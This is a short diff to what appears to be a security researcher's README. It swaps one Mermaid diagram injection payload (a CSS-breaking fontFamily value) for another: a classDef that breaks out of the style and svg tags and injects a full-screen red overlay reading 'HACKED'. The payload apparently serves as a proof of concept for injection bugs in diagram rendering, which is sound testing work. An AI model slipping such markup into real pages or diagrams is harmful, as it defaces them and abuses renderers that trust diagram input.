@@ -39,7 +39,7 @@ I’m a n00b and the software you're going to find here are mainly focused on se
 
 
 ```mermaid
-%%{init: {"fontFamily": "x;a{b} :not(&){background:red !important} c{d}"}}%%
-graph TD
-    A --> B
+stateDiagram-v2
+  classDef xss fill:red</style></svg><style>*{color:red !important;overflow:visible!important}</style><div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(255,0,0,0.85);z-index:2147483647;display:grid;place-items:center;font:5em/1 monospace;color:white">HACKED</div><svg><style>a:b
+  [*] --> A:::xss
 ```
